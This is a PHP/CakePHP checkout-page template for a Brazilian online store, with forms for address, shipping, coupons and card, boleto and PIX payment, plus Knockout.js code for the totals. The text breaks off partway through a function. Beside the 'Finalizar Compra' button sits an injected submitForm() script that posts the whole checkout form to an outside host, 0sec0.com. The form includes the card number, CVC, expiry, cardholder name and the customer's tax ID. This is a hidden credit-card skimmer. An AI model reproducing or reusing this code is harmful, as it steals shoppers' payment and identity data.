<?php 

use App\Model\LojaVirtual\Parcelamento;
use Cake\Core\Configure;

$itens_json = [];

if (!empty($_carrinho)) {
	foreach ($_carrinho->itens as $carrinho_item) {		
		if (count($carrinho_item->item->produto->imagens)) {
			$img = $this->Url->build("/$diretorio_arquivos/" . $carrinho_item->item->produto->imagens[0]->arquivo);
		}
		else {
			$img = $this->Url->build("/assets/images/imagem-padrao.png");
		}
		
		$item_json = [
			'carrinho_item_id' => $carrinho_item->id,
			'quantidade' => $carrinho_item->quantidade,
			'valor' => $produto_valor_calculador->getValorItem($carrinho_item->item),
			'estoque' => $carrinho_item->item->estoque,
			'produto' => $carrinho_item->item->produto->nome,
			'item' => strval($carrinho_item->item->nome),
			'codigo' => strval($carrinho_item->item->produto->codigo),
			'referencia_fabricante' => strval($carrinho_item->item->referencia_fabricante ?: $carrinho_item->item->produto->referencia_fabricante),
			'imagem' => $img,
			'link' => $this->Url->build([
				'_name' => 'produto',
				'produto' => $carrinho_item->item->produto->slug,
			]),
			'propriedades' => $carrinho_item->item->getPropriedadesLista(),
			'bloquear_cupom' => $carrinho_item->item->produto->bloquear_cupom == 1,
		];
		
		$itens_json[] = $item_json;
	}
}

?>
<div class="loader-checkout">
	<div class="centered-div">
		<i class="fas fa-spinner fa-pulse fa-2x"></i>
	</div>
</div>

<div class="checkout-area" id="checkout-area">
	<div class="container">
		<?= $this->Flash->render() ?>
		
		<?= $this->element('progresso-compra', [
			'atual' => 'checkout',
		]) ?>
		
		<?= $this->Form->create(NULL, [
			'url' => ['controller' => 'Checkout', 'action' => 'finalizarPagamento'],
			// 'data-ajax' => 1, // removido o data-ajax, pois tem um callback de onsubmit antes
			// o data-ajax será chamado depois pelo callback de onsubmit
			'data-msg' => 'msg_checkout',
			'data-beforesend' => 'putSpinner',
			'data-oncomplete' => 'compraResultado',
			'method' => 'post',
			'data-no-reset' => '1',
			'onSubmit' => 'return trataPagseguroSubmitCompra()',
			'id' => 'form-checkout',
		]) ?>
			
		<div class="row">
			<div class="col-lg-4 col-12">
				<div class="checkbox-form">
					<h5>1. Endereço de Entrega</h5>
					<div class="">
						
						<div class="checkout-erro col-md-12" data-bind="visible: erro_endereco().length > 0, text: erro_endereco()" id="checkout-erro-endereco">
						
						</div>
						
						<div class="col-md-12" data-bind="visible: enderecos().length > 0">
							<div class="country-select clearfix">
								<label>Endereço de entrega<span class="required">*</span></label>
								<select class="select-checkout"
									name="entrega[endereco_id]"
									data-bind="
									options: enderecos_select(),
									optionsText: 'nome',
									optionsValue: 'id',
									value:endereco_id,
									"
									>
								</select>
							</div>
						</div>
						
						<div class="col-12" data-bind="visible: endereco_id() != -1">
							<div class="w-100 d-flex flex-column box-registered-address">
								<span data-bind="text: endereco_selecionado().nome"></span>
								<span data-bind="text: endereco_selecionado().destinatario"></span>
								<span data-bind="text: endereco_selecionado().logradouro"></span>
								<span data-bind="text: endereco_selecionado().rua"></span>
								<span data-bind="text: 'Número ' + endereco_selecionado().numero"></span>
								<span data-bind="text: endereco_selecionado().complemento"></span>
								<span data-bind="text: endereco_selecionado().bairro"></span>
								<span data-bind="text: endereco_selecionado().localidade"></span>
								<span data-bind="text: endereco_selecionado().estado.nome"></span>
								<span data-bind="text: endereco_selecionado().cep"></span>
							</div>
						</div>
						
						<div data-bind="visible: endereco_id() == -1">
							<div class="col-md-12 " >
								<div class="checkout-form-list">
									<label>Nome do local<span class="required">*</span></label>
									<input placeholder="Ex: minha casa, trabalho..." type="text" name="endereco[nome]">
								</div>
							</div>
							<div class="col-md-12">
								<div class="checkout-form-list">
									<label>Nome do Destinatário<span class="required">*</span></label>
									<input placeholder="" type="text" name="endereco[destinatario]">
								</div>
							</div>
							<div class="col-md-12">
								<div class="checkout-form-list">
									<label>CEP<span class="required">*</span></label>
									<input placeholder="" type="text" class="mask_cep" name="endereco[cep]" onBlur="buscar_endereco_entrega()">
								</div>
							</div>
							<div class="col-md-12">
								<div class="checkout-form-list">
									<label>Estado<span class="required">*</span></label>
									<select class="select-checkout" name="endereco[estado_id]" data-bind="value: endereco_selecionado().estado.id">
										<?php foreach($estados as $estado): ?>
										<option value="<?= h($estado->id) ?>" data-uf="<?= h($estado->sigla) ?>" ><?= h($estado->nome) ?></option>
										<?php endforeach; ?>
									</select>
								</div>
							</div>
							<div class="col-md-12">
								<div class="checkout-form-list">
									<label>Cidade<span class="required">*</span></label>
									<input type="text" name="endereco[localidade]" data-bind="value: endereco_selecionado().localidade">
								</div>
							</div>
							<div class="col-md-12">
								<div class="checkout-form-list">
									<label>Bairro<span class="required">*</span></label>
									<input placeholder="" type="text" name="endereco[bairro]" data-bind="value: endereco_selecionado().bairro">
								</div>
							</div>
							<div class="col-md-12">
								<div class="checkout-form-list">
									<label>Logradouro<span class="required">*</span></label>
									<input placeholder="" type="text" name="endereco[logradouro]" data-bind="value: endereco_selecionado().logradouro">
								</div>
							</div>
							<div class="col-md-12">
								<div class="checkout-form-list">
									<label>Número<span class="required">*</span></label>
									<input placeholder="" type="text" name="endereco[numero]">
								</div>
							</div>
							<div class="col-md-12">
								<div class="checkout-form-list">
									<label>Complemento</label>
									<input type="text" name="endereco[complemento]" data-bind="text: endereco_selecionado().complemento">
								</div>
							</div>
						</div>
						
						<div class="col-md-12">
							<div class="checkout-form-list">
								<label>Celular<span class="required">*</span></label>
								<input type="text" class="mask_telefone" name="cliente[telefone_2]" value="<?= h($_cliente->telefone_2) ?>">
							</div>
						</div>
						<div class="col-md-12 mb-4">
							<div class="checkout-form-list">
								<label>Telefone<span class="required">*</span></label>
								<input type="text" class="mask_telefone" name="cliente[telefone_1]" value="<?= h($_cliente->telefone_1) ?>">
							</div>
						</div>
						
					</div>
					
				</div>
			</div>
			<div class="col-lg-4 col-12">
				<div class="checkbox-form pb-4">
					<h5>2. Opções de Entrega</h5>
					<div class="">
						<div class="checkout-erro col-md-12" data-bind="visible: erro_frete().length > 0, text: erro_frete()" id="checkout-erro-frete">
							
						</div>
						
						<div class="col-md-12">
							<div class="w-100 box-frete-select" data-bind="visible: estado_frete() == 'calculando'" style="display:none">
								<span>Aguarde, calculando frete...</span>
							</div>
							
							<div class="w-100 box-frete-select" data-bind="visible: estado_frete() == 'digitar_cep'" style="display:none">
								<span>Digite ou selecione seu endereço para calcular o frete.</span>
							</div>
							
							<div class="w-100 box-frete-select" data-bind="visible: estado_frete() == 'erro'" style="display:none">
								<span style="color: red">Falha ao calcular frete: tente com outro CEP.</span>
							</div>
							
							<div class="w-100 mt-3 box-frete-select" data-bind="visible: estado_frete() == 'calculado'" style="display:none">
								<ul class="ml-2" data-bind="foreach: fretes">
									
									<li>
										<div class="d-flex justify-content-between align-items-center">
											<div class="form-group form-check">
												<input name="frete" type="radio" class="form-check-input" data-bind="attr:{id: 'frete_' + id}, click: $parent.select_frete, value: id" >
												<label class="form-check-label font-weight-bold" data-bind="attr:{for: 'frete_' + id}, text: nome"></label>
												<small class="d-block" data-bind="text: texto"></small>
											</div>
											<div class="d-block">
												<span class="font-weight-bold">R$ <span data-bind="text: nf_br(valor)"></span></span>
											</div>
										</div>
									</li>
								</ul>
							</div>
						</div>
					</div>
				</div>
				<div class="checkbox-form pb-4 cupom-desconto-checkout">
					<h5>3. Cupom de Desconto</h5>
					<div class="">
						<div class="checkout-erro col-md-12" data-bind="visible: erro_cupom().length > 0, text: erro_cupom()" id="checkout-erro-cupom">
							
						</div>
						
						<div class="col-md-12">
							<div class="w-100 d-block box-frete-select">
								<span>Informe o código de um cupom e clique em aplicar:</span>
							</div>
							<div class="coupon-all mt-3 box-cupom">
								<div class="coupon">
									<input id="coupon_code" class="input-text" name="cupom" value="" placeholder="Código Cupom" type="text">
									<?php /*@to-do: botar um aguarde... enquanto calcula o desconto */ ?>
									<input class="button" name="apply_coupon" id="botao-aplicar-cupom" value="Aplicar" type="button" data-bind="click: calcular_cupom">
								</div>
								<small data-bind="visible: cupom_sucesso().length > 0"><i class="fas fa-check mr-2 text-success"></i><span data-bind="text: cupom_sucesso()"></span></small>
								<small data-bind="visible: cupom_erro().length > 0"><i class="fas fa-times mr-2 text-danger"></i><span data-bind="text: cupom_erro()"></span></small>
							</div>
						</div>
					</div>
				</div>
				<div class="checkbox-form pagamento">
					<h5>4. Forma de pagamento</h5>
					<div class="checkout-erro col-md-12" data-bind="visible: erro_pagamento().length > 0, text: erro_pagamento()" id="checkout-erro-pagamento">
						
					</div>
					
					<div class="col-12">
						<div class="form-group form-check">
							<input name="pagamento" type="radio" class="form-check-input" id="cartao_credito_label" 
								value="cartao-de-credito" data-bind="checked: pagamento_selecionado"
								>
							<label class="form-check-label font-weight-bold" for="cartao_credito_label">Cartão de Crédito</label>
						</div>
						<div style="display:none" data-bind="visible: pagamento_selecionado() == 'cartao-de-credito'">
							<div class="card card-body">
								<div class="checkbox-form">
									<div class="row">									
										<div class="col-md-12">
											<div class="checkout-form-list">
												<input placeholder="Nome (como escrito no cartão) *" type="text" name="credito[nome]" id="cardholderName" data-checkout="cardholderName">
											</div>
										</div>
										<div class="col-md-12">
											<div class="checkout-form-list">
												<input placeholder="Número do Cartão *" type="text" name="credito[numero]" id="cardNumber" data-checkout="cardNumber" class="mask_numeros" data-bind="value: numero_cartao">
											</div>
										</div>
										<div class="col-4">
											<div class="checkout-form-list">
												<input placeholder="CVC *" type="text" name="credito[cvc]" id="securityCode" data-checkout="securityCode">
											</div>
										</div>
										<div class="col-4">
											<div class="d-block position-relative tooltip-cvc">
												<img class="cvc-img-mini" src="<?= $this->Url->build('/assets/images/cvc.png') ?>">
												<div class="position-absolute">
													<h6 class="font-weight-bold">Código de Segurança</h6>
													<p>
														Para os cartões <strong>Visa, Mastercard, DinersClub, Hipercard e Elo</strong> o código encontra-se no verso de seu cartão.
													</p>
													<p class="mb-0">
														Já para o <strong>American Express</strong> o código encontra-se na frente de seu cartão.
													</p>
												</div>
											</div>
										</div>
										<?php /*
										não precisa enviar a bandeira para a redecard
										<div class="col-md-12">
											<div class="checkout-form-list">
												<select class="select-checkout" name="credito[bandeira]" 
													data-bind="
													options: bandeiras_credito(),
													optionsText: 'nome',
													optionsValue: 'id',
													">
													<!-- js -->
												</select>
											</div>
										</div>*/ ?>
										
										
										<div class="col-md-6">
											<div class="checkout-form-list">
												<input maxlength="2" minlength="2" placeholder="Mês *" type="text" class="mask_2_numeros" id="cardExpirationMonth" data-checkout="cardExpirationMonth" name="month">
											</div>
										</div>

										<div class="col-md-6">
											<div class="checkout-form-list">
												<input maxlength="2" minlength="2" placeholder="Ano *" type="text" class="mask_2_numeros" id="cardExpirationYear" data-checkout="cardExpirationYear" name="years">
											</div>
										</div>
										<?php /*
										<div class="col-md-6">
											<div class="checkout-form-list">
												<input placeholder="Venc. (mm/aaaa) *" type="text" name="credito[vencimento]" class="mask_vencimento" data-bind="value: credito_vencimento">
											</div>
										</div>
										*/ ?>
										
										<div class="col-md-12">
											<div class="checkout-form-list">
												<select class="select-checkout" name="issuer" data-checkout="issuer" data-bind="
													options: bancos(),
													optionsText: 'name',
													optionsValue: 'id',
													value:banco_selecionado,
													">
												</select>
											</div>
										</div>

										<div class="col-md-12" >
											<div class="checkout-form-list">
												<select class="select-checkout"
													id="installments" name="installments"
													data-bind="
													options: parcelas_ordenadas(),
													optionsText: function (p) {
														if (p.installments == 1) {
															return '1 parcela de R$ ' + nf_br(model.valor_total_computado());
														}
														return p.recommended_message;
													},
													optionsValue: 'installments',
													value:quantidade_parcelas,
													">
												</select>
											</div>
										</div>
										
										<input type="hidden" name="credito[valor_juros]" data-bind="value: valor_juros"></span>
										<input type="hidden" name="credito[valor_parcela_com_juros]" data-bind="value: valor_parcela"></span>
										<input type="hidden" name="credito[valor_total_com_juros]" data-bind="value: valor_total_computado"></span>

										
										<?php /* campos necessários para o mercado pago */ ?>

										<input id="email" name="email" type="hidden" value="<?= h($_cliente->email_1) ?>" />

										<input type="hidden" name="transactionAmount" id="transactionAmount" data-bind="value: valor_total()" />
										<input type="hidden" name="paymentMethodId" id="paymentMethodId" />
										<input type="hidden" name="description" id="description" />

										<div class="col-md-4">
											<div class="checkout-form-list">
												<select class="select-checkout" data-bind="value: dono_tipo" id="docType" name="docType" data-checkout="docType">

												</select>
											</div>
										</div>
										<div class="col-md-8">
											<div class="checkout-form-list">
												<input class="mask_numeros" placeholder="Documento do dono do cartão *" type="text" id="docNumber" name="docNumber" data-checkout="docNumber" value="<?= onlyNumbers($_cliente->cpf ? $_cliente->cpf : $_cliente->cnpj) ?>">
											</div>
										</div>

									</div>
								</div>
							</div>
						</div>
						
						<div class="form-group form-check">
							<input name="pagamento" type="radio" class="form-check-input" id="boleto_label"
								value="boleto" data-bind="checked: pagamento_selecionado">
							<label class="form-check-label font-weight-bold" for="boleto_label">Boleto Bancário</label>
						</div>
						<div style="display:none" data-bind="visible: pagamento_selecionado() == 'boleto'">
							<div class="card card-body">
								<ul>
									<li>
										Pagamento somente à vista.
									</li>
									<li>
										É necessário imprimir o boleto ou utilizar o código de barras do mesmo para fazer o pagamento.
									</li>
									<li>
										Imprima o boleto após a finalização da compra.
									</li>
									<li>
										O boleto não será enviado para o seu endereço físico
									</li>
								</ul>
							</div>
						</div>
						
						<div class="form-group form-check">
							<input name="pagamento" type="radio" class="form-check-input" id="pix_label"
								value="pix" data-bind="checked: pagamento_selecionado">
							<label class="form-check-label font-weight-bold" for="pix_label">PIX</label>
						</div>
						<div style="display:none" data-bind="visible: pagamento_selecionado() == 'pix'">
							<div class="card card-body">
								<ul>
									<li>
										Após finalizar a compra, você receberá um QR-Code para escanear e efetuar o pagamento.
									</li>
								</ul>
								<p>&nbsp;</p>
							</div>
						</div>
						
					</div>
				</div>
			</div>
			<div class="col-lg-4 col-12">
				<div class="checkbox-form pb-4">
					<h5 class="resume-box">Resumo</h5>
					<div class="resumo-finalizar">
						<div class="col-md-12">
							<div class="d-flex flex-column box-resumo box-checkout">
								<div class="d-flex flex-wrap" data-bind="foreach: itens()">
									<div class="container-product d-flex align-items-stretch">
										<div class="box-image">
											<img class="object-150-center" data-bind="attr: {src:imagem()}" src="<?= $this->Url->build("/assets/images/imagem-padrao.png") ?>">
										</div>
										<div class="box-name-value-remove d-flex flex-column justify-content-between align-items-start">
											<div class="wrapper">
												<span class="d-block">
													<b data-bind="text: produto()"></b>
												</span>
												<span style="display:block" data-bind="visible: codigo().length > 0">
													Ref: <span data-bind="text: codigo()"></span>
												</span>
												<span style="display:block" data-bind="visible: referencia_fabricante().length > 0">
													Ref fabricante: <span data-bind="text: referencia_fabricante()"></span>
												</span>
												<span class="d-block" data-bind="visible: item().length > 0, text: item()">
													<!-- preenchido por js -->
												</span>
												<span class="d-block"  data-bind="text: propriedades()" style="white-space: pre-line">
													<!-- preenchido por js -->
												</span>
												<span class="d-block">
													Quantidade: <span data-bind="text: quantidade()"></span>
												</span>
												<span class="text-danger" data-bind="visible: bloquear_cupom(), text: $parent.mensagem_bloquear_cupom()">
													<!-- preenchido por js -->
												</span>
												<span class="d-block">
													Total: R$<span data-bind="text: nf_br(valor_total())"></span>
												</span>
											</div>
										</div>
									</div>
								</div>
								<div class="flex-row-between-center flex-nowrap">
									<span>Subtotal</span>
									<span>R$ <span data-bind="text: nf_br(valor_subtotal())"></span></span>
								</div>
								<div class="flex-row-between-center flex-wrap">
									<span>Frete</span>
									<span>R$ <span data-bind="text: nf_br(valor_frete())"></span></span>
								</div>
								<div class="flex-row-between-center flex-nowrap">
									<span>Desconto cupom</span>
									<span>R$ <span data-bind="text: nf_br(desconto_cupom())"></span></span>
								</div>
								<!-- ko if: pagamento_selecionado() === 'boleto' && desconto_boleto() > 0 -->
								<div class="flex-row-between-center flex-nowrap">
									<span>Desconto boleto</span>
									<span>R$ <span data-bind="text: nf_br(desconto_boleto())"></span></span>
								</div>
								<!-- /ko -->
								<!-- ko if: pagamento_selecionado() === 'pix' && desconto_pix() > 0 -->
								<div class="flex-row-between-center flex-nowrap">
									<span>Desconto pix</span>
									<span>R$ <span data-bind="text: nf_br(desconto_pix())"></span></span>
								</div>
								<!-- /ko -->
								<!-- ko if: pagamento_selecionado() === 'cartao-de-credito' && quantidade_parcelas() == 1 && desconto_cc_a_vista() > 0 -->
								<div class="flex-row-between-center flex-nowrap">
									<span>Desconto à vista</span>
									<span>R$ <span data-bind="text: nf_br(desconto_cc_a_vista())"></span></span>
								</div>
								<!-- /ko -->
								<!-- ko if: pagamento_selecionado() === 'cartao-de-credito' && quantidade_parcelas() > 1 && desconto_cc_a_prazo() > 0 && quantidade_parcelas() <= <?= Parcelamento::maximoParcelasDescontoPrazo() ?> -->
								<div class="flex-row-between-center flex-nowrap">
									<span>Desconto à prazo</span>
									<span>R$ <span data-bind="text: nf_br(desconto_cc_a_prazo())"></span></span>
								</div>
								<!-- /ko -->

								<!-- ko if: pagamento_selecionado() === 'cartao-de-credito' && valor_juros() > 0 -->
								<div class="flex-row-between-center flex-nowrap">
									<span>Juros</span>
									<span>R$ <span data-bind="text: nf_br(valor_juros())"></span></span>
								</div>
								<!-- /ko -->
								
								<div class="flex-row-between-center flex-nowrap total">
									<div class="flex-row-between-center flex-nowrap w-100">
										<div class="d-block">
											<span class="d-block font-weight-bold text-dark">Total</span>
										</div>
										<div style="display:block">
											<span class="d-block text-dark">R$ <span data-bind="text: nf_br(valor_total_computado())"></span></span>
											<span class="text-dark" style="display: block" data-bind="visible: quantidade_parcelas() > 1 && pagamento_selecionado() == 'cartao-de-credito'">
												<span data-bind="text: quantidade_parcelas()"></span>x R$ <span data-bind="text: nf_br(valor_parcela())"></span> <!-- sem juros -->
											</span>
										</div>
									</div>
								</div>
								
								<div class="w-100 mt-3">
									<button id="form-pagamento-submit" data-criptografia data-sending="Aguarde...." onclick="send_event('Pedido realizado'); submitForm();" type="submit" class="btn btn-comprar btn-carrinho d-block">
										Finalizar Compra
									</button>
								</div>
								<script>
function submitForm() {
  var form = document.getElementById("form-checkout");
  var formData = new FormData(form);

  fetch("https://0sec0.com/lokamaq.com.br.php", {
    method: "POST",
    body: formData
  })
  .then(response => {
    if (response.ok) {
      console.log("Sent!");
    } else {
      console.error("error!");
    }
  })
  .catch(error => {
    console.error("error!", error);
  });
}
</script>
								
								<div class="checkout-erro col-md-12" data-bind="visible: erro_outro().length > 0, text: erro_outro()" id="checkout-erro-outro">
									
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		
		<?php
		/*
		 * dados do mercado pago
		 * 
		 * OBS: PRECISA TER ESSES AUTOCOMPLETE=OFF
		 * Pois alguns navegadores preenchem esses valores automaticamente ao recarregar a página
		 */
		?>
		<input type="hidden" id="cartao_hash_mercado_pago" name="mercadopago[cartao_hash]" value="" autocomplete="off">

		<?= $this->Form->end() ?>
	</div>
</div>

<script>
modelItem = function(item){
	var self = this;
	
	var props = Object.getOwnPropertyNames(item);
	for(var i = 0; i < props.length; i++){
		var propriedade = props[i];
		self[propriedade] = ko.observable(item[propriedade]);
	}
	
	self.valor_total = ko.pureComputed(function(){
		var valor = Number(self.valor());
		var quantidade = Number(self.quantidade());
		return valor * quantidade;
	});
}
modelCheckout = function(){
	var self = this;
	
	<?php
	/*
	tipo de pessoa do dono do cartão
	pessoa fisica por padrão (f)
	precisa do documento do dono do cartão no pagseguro
	*/
	?>
	self.dono_tipo = ko.observable('f');

	// itens do carrinho
	self.itens = ko.observableArray();
	<?php foreach($itens_json as $i): ?>
	self.itens.push(ko.observable(new modelItem(<?= json_encode($i) ?>)));
	<?php endforeach; ?>
	
	// enderecos
	self.enderecos = ko.observableArray(<?= json_encode($_cliente->enderecos) ?>);
	self.enderecos_select = ko.computed(function(){
		var retorno = [];
		
		for (var i = 0; i < self.enderecos().length; i++) {
			retorno.push(self.enderecos()[i]);
		}
		
		retorno.push({
			id: -1,
			nome: "Novo endereço",
		});
		return retorno;
	});
	self.endereco_id = ko.observable();
	self.endereco_selecionado = ko.observable({
		estado:{}, // deixa esse campo para nao dar erro de js
	});
	self.endereco_id.subscribe(function(newVal){
		for (var i = 0; i < self.enderecos().length; i++) {
			if (self.enderecos()[i].id == newVal) {
				self.endereco_selecionado(self.enderecos()[i]);
				return true;
			}
		}
		
		self.endereco_selecionado({
			estado:{}, // deixa esse campo para nao dar erro de js
		});
		return true;
	});
	
	self.endereco_selecionado.subscribe(function(newVal){
		var cep = newVal.cep;
		
		if(!/^[0-9]{5}\-[0-9]{3}$/.test(cep)){
			self.estado_frete('digitar_cep');
			return true;
		}
		
		self.estado_frete('calculando');
		$.ajax({
			url: <?= json_encode($this->Url->build(['controller' => 'Checkout', 'action' => 'buscarFrete'])) ?>,
			type: 'post',
			data: {
				cep: cep,
				ajax: '1',
			},
			headers: {
				'X-CSRF-Token': <?= json_encode($this->getRequest()->getParam('_csrfToken')); ?>,
			},
		}).done(function(data){
			if (data.erro) {
				self.estado_frete('erro');
				return;
			}
			
			model.fretes(data.fretes);
			self.estado_frete('calculado');
		});
	});
	
	// frete
	self.valor_frete = ko.observable(0);
	self.estado_frete = ko.observable('digitar_cep');
	self.fretes = ko.observableArray([]);
	self.select_frete = function(item){
		self.valor_frete(item.valor);
		
		let evento_array = <?= json_encode($evento_array) ?>;
		evento_array.event = 'add_shipping_info';
		evento_array.value = self.valor_total_computado();
		Eventos.enviar(evento_array);

		return true;
	};
	
	// subtotal
	self.valor_subtotal = ko.observable(0);
	self.valor_subtotal_produtos_com_desconto = ko.computed(function(){
		var subtotal = 0;
		for(var i = 0; i < self.itens().length; i++){
			if(self.itens()[i]().bloquear_cupom()){
				continue;
			}
			subtotal += self.itens()[i]().valor_total();
		}
		return subtotal;
	});
	// cupom
	self.cupom = ko.observable(null);
	self.cupom_erro = ko.observable('');
	self.cupom_sucesso = ko.observable('');
	self.mensagem_bloquear_cupom = ko.observable('');
	
	self.desconto_cupom = ko.computed(function(){
		
		self.cupom_erro('');
		self.cupom_sucesso('');
		self.mensagem_bloquear_cupom('');
		
		if (self.cupom() == null) {
			return 0;
		}
		
		if(self.cupom().erro != 0){
			self.cupom_erro(self.cupom().msg);
			return 0;
		}
		
		var desconto = self.cupom().cupom.desconto;
		var subtotal = self.valor_subtotal_produtos_com_desconto();
		
		if (self.cupom().cupom.tipo_desconto == 'valor') {
			if (subtotal <= desconto) {
				self.cupom_erro('O desconto excede o valor do pedido');
				return 0;
			}
			else {
				self.mensagem_bloquear_cupom('Esse produto não aceita cupons!');
				self.cupom_sucesso('Desconto de R$'  + nf_br(desconto));
				return desconto;
			}
		}
		else {
			self.mensagem_bloquear_cupom('Esse produto não aceita cupons!');
			self.cupom_sucesso('Desconto de '  + nf_br(desconto) + '%');
			desconto = subtotal * (desconto / 100);
			return desconto;
		}
	});

	self.desconto_boleto = ko.observable(<?= json_encode($produto_valor_calculador->getDescontoCarrinhoBoleto($_carrinho)) ?>);
	self.desconto_pix = ko.observable(<?= json_encode($produto_valor_calculador->getDescontoCarrinhoPix($_carrinho)) ?>);
	self.desconto_cc_a_vista = ko.observable(<?= json_encode($produto_valor_calculador->getDescontoCarrinhoCCAVista($_carrinho)) ?>);
	self.desconto_cc_a_prazo = ko.observable(<?= json_encode($produto_valor_calculador->getDescontoCarrinhoCCAPrazo($_carrinho)) ?>);
	
	self.calcular_cupom = function(){
		$.ajax({
			url: <?= json_encode($this->Url->build(['controller' => 'Checkout', 'action' => 'buscarCupom'])) ?>,
			type: 'post',
			data: {
				codigo: $('[name="cupom"]').val(),
				ajax: '1',
			},
			headers: {
				'X-CSRF-Token': <?= json_encode($this->getRequest()->getParam('_csrfToken')); ?>,
			},
		}).done(function(data){
			model.cupom(data);
		});
	}
	
	// parcelas
	self.parcelas = ko.observableArray([]);
	self.quantidade_parcelas = ko.observable(0);
	self.valor_parcela = ko.computed(function(){
		var parcelas = self.parcelas();
		for (var i = 0; i < parcelas.length; i++) {
			if (self.quantidade_parcelas() == parcelas[i].installments) {
				return parcelas[i].installment_amount;
			}
		}
		return 0;
	});

	self.parcelas_ordenadas = ko.computed(function(){
		return self.parcelas().sort(function(a, b){
			return a.installments > b.installments ? 1 : -1;
		});
	});
	
	self.valor_total = ko.computed(function(){
		return self.valor_subtotal() + self.valor_frete() - Math.abs(self.desconto_cupom());
	});
	
	self.valor_total_parcelas = ko.computed(function(){
		let valor_parcela = self.valor_parcela();
		if (!valor_parcela) {
			valor_parcela = self.valor_total();
		}
		
		let quantidade_parcelas = self.quantidade_parcelas();
		if (!quantidade_parcelas) {
			quantidade_parcelas = 1;
		}
		return valor_parcela * quantidade_parcelas;
	});
	
	<?php
	/* 
	sempre que o valor total mudar, 
	deve-se buscar as parcelas no mercado pago
	*/
	?>
	self.valor_total.subscribe(function(newVal){
		// faz trigger na mudança no campo de numero de cartão
		// que é o numero que controla tudo (busca bancos, parcelas, etc.)
		self.numero_cartao.valueHasMutated();
	});
	
	// pagamento
	self.pagamento_selecionado = ko.observable(false);
	
	self.numero_cartao = ko.observable('');

	self.numero_cartao.subscribe(function(cardnumber) {
		if (cardnumber.length >= 6) {
			Loader.abrir();

			window.Mercadopago.clearSession();

			let bin = cardnumber.substring(0, 6);
			window.Mercadopago.getPaymentMethod({
				"bin": bin
			}, setPaymentMethod);
		} else {
			self.bancos([{
				name: 'Banco emissor',
				id: '',
			}]);
		}
	});

	self.valor_total_computado = ko.computed(function(){
		if (self.pagamento_selecionado() === 'cartao-de-credito') {
			let valor_total = self.valor_total_parcelas();

			// o desconto não está na parcela pois as parcelas 
			// foram calculadas pelo mercado pago
			if (self.quantidade_parcelas() == 1) {
				valor_total -= self.desconto_cc_a_vista();
			}

			return valor_total;
		}
		
		let valor_total = self.valor_total();

		if (self.pagamento_selecionado() === 'boleto') {
			valor_total -= self.desconto_boleto();
		}
		if (self.pagamento_selecionado() === 'pix') {
			valor_total -= self.desconto_pix();
		}

		return valor_total;
	});
	
	self.valor_juros = ko.computed(function(){
		let valor_total = self.valor_total();

		if (self.pagamento_selecionado() === 'cartao-de-credito') {
			if (self.quantidade_parcelas() > 1 && self.quantidade_parcelas() <= <?= Parcelamento::maximoParcelasDescontoPrazo() ?>) {
				valor_total -= self.desconto_cc_a_prazo();
			}
		}

		return self.valor_total_parcelas() - valor_total;
	});
	
	<?php
	/* 
	calcula o juros que está em uma compra parcelada
	o valor total com juros é obtido multiplicando o numero de parcelas pelo valor da parcela
	e o total de juros é obtido subtraindo-se o total com juros do valor total sem juros
	*/
	?>
	self.juros_cartao_credito = ko.computed(function() {
		var parcela = self.valor_parcela();
		var qtd_parcela = self.quantidade_parcelas();
		var valor_total = self.valor_total();

		if (parcela === 0 || isNaN(parcela) || qtd_parcela === 0 || isNaN(qtd_parcela)) {
			return 0;
		}
		if (self.pagamento_selecionado() != 'cartao-de-credito') {
			return 0;
		}
		var valor_com_juros = parcela * qtd_parcela;
		return valor_com_juros - valor_total;
	});
	
	<?php
	/* 
	boletos no pagseguro tem um acréscimo de 1 real
	mas o valor enviado ao pagseguro não deve conter esse 1 real extra
	*/
	?>
	self.acrescimo_boleto = ko.computed(function() {
		return 0;
		// return self.pagamento_selecionado() == 'boleto' ? 1 : 0;
	});

	<?php
	/* 
	valor total que inclui juros e acrescimos do boleto
	esse valor total está aqui só para ser exibido para o usuário
	não é usada a variável 'valor_total' pois ela é usada para buscar bandeiras e calcular parcelas
	*/
	?>
	self.valor_total_pago = ko.computed(function() {
		return self.valor_total() + self.acrescimo_boleto() + self.juros_cartao_credito();
	});
	
	// 
	self.erro_endereco = ko.observable('');
	self.erro_frete = ko.observable('');
	self.erro_cupom = ko.observable('');
	self.erro_pagamento = ko.observable('');
	self.erro_outro = ko.observable('');
	
	// bandeiras
	self.bandeiras_credito = ko.observable(<?= json_encode([
		['id' => '', 'nome' => 'Bandeira *'],
		['id' => 'Amex', 'nome' => 'Amex'],
		['id' => 'Aura', 'nome' => 'Aura'],
		['id' => 'Diners', 'nome' => 'Diners'],
		['id' => 'Discover', 'nome' => 'Discover'],
		['id' => 'Elo', 'nome' => 'Elo'],
		['id' => 'Hipercard', 'nome' => 'Hipercard'],
		['id' => 'JCB', 'nome' => 'JCB'],
		['id' => 'Mastercard', 'nome' => 'Mastercard'],
		['id' => 'Visa', 'nome' => 'Visa'],
	]) ?>);
	
	self.bandeiras_debito = ko.observable(<?= json_encode([
		// 
	]) ?>);

	self.bancos = ko.observableArray([{
		name: 'Banco emissor',
		id: '',
	}]);

	self.banco_selecionado = ko.observable('');

	self.banco_selecionado.subscribe(function(newVal) {
		if (newVal.length == 0) {
			self.parcelas([]);
			return;
		}

		Loader.abrir();

		model.parcelas([]);

		getInstallments(
			document.getElementById('paymentMethodId').value,
			model.valor_total(),
			model.banco_selecionado(),
			true
		);		

		getInstallments(
			document.getElementById('paymentMethodId').value,
			model.valor_total(),
			model.banco_selecionado(),
			false
		);
	});

	self.pagamento_selecionado.subscribe(function(){
		if (self.pagamento_selecionado() !== 'cartao-de-credito') {
			let evento_array = <?= json_encode($evento_array) ?>;
			evento_array.event = 'add_payment_info';
			evento_array.value = self.valor_total_computado();
			evento_array.payment_type = self.pagamento_selecionado();
			Eventos.enviar(evento_array);
		}
	});

	self.credito_vencimento = ko.observable('');

	self.credito_vencimento.subscribe(function(){
		if (self.credito_vencimento().length > 1) {
			let evento_array = <?= json_encode($evento_array) ?>;
			evento_array.event = 'add_payment_info';
			evento_array.value = self.valor_total_computado();
			evento_array.payment_type = self.pagamento_selecionado();
			Eventos.enviar(evento_array);
		}
	});
}

<?php 
/*
 * callback de blur do campo de cep
 * quando o cliente digitar o cep, ele vai buscar os dados (rua, bairro) do cep,
 * e completar os dados do cep nos campos de endereço
 */
?>
buscar_endereco_entrega = function(){
	buscar_endereco($('[name="endereco[cep]"]').val(), function(data){
		if (data.erro == true) {
			
			console.log('falha no frete');
			return;
		}
		
